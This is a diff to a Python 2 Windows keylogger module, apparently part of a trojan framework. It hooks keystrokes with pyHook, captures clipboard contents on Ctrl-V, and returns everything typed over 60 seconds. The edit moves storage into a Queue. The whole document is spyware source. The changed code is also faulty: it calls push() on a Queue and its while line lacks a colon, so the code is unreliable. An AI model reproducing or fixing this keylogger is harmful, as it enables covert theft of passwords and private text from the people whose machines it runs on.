@@ -7,12 +7,13 @@ import sys
 import subprocess
 import time
 import os
+import Queue
 
 user32   = windll.user32
 kernel32 = windll.kernel32
 psapi    = windll.psapi
 current_window = None
-keystroke = ""
+keystroke = None
 
 def get_current_process():
     global keystroke
@@ -60,7 +61,7 @@ def KeyStroke(event):
     # 標準的なキーが押下されたかチェック
     if event.Ascii > 32 and event.Ascii < 127:
         print chr(event.Ascii)
-        keystroke = keystroke + chr(event.Ascii)
+        keystroke.push(chr(event.Ascii))
     else:
         # [Ctrl-V]が押下されたならば、クリップボードのデータを取得
         if event.Key == "V":
@@ -78,6 +79,7 @@ def run(**args):
 	global keystroke
 	
 	print "[*] In keylogger module."
+	keystroke = Queue.Queue()
 
 	# フックマネージャーの作成と登録
 	kl         = pyHook.HookManager()
@@ -89,6 +91,10 @@ def run(**args):
 
 	time.sleep(60)
 
-        print keystroke
+        retval = ""
+        while not keystroke.empty()
+            retval = retval + str(keystroke.get())
 
-	return str(keystroke)
+        print retval
+
+	return retval
